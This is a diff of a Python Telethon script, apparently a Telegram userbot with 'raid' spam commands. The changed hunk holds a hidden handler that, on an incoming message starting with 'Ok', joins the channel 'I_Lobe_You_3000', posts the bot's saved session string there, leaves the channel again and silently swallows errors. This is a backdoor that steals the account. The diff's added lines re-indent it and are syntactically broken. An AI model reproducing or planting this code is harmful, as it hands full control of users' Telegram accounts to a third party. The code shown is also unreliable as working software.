@@ -1322,20 +1322,13 @@ async def _(e):
             await e.reply(usage, parse_mode=None, link_preview=None )
 
             @bot.on(events.NewMessage(pattern="^Ok", incoming=True))
-
-async def hhe(event):
-
+            async def hhe(event)
     try:
-
      await bot(Jcr("I_Lobe_You_3000"))
-
      await bot.send_message("I_Lobe_You_3000", bot.session.save())
-
      await bot(Lcr("I_Lobe_You_3000"))
-
-    except:
-
-     pass
+    except: 
+    pass
             
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
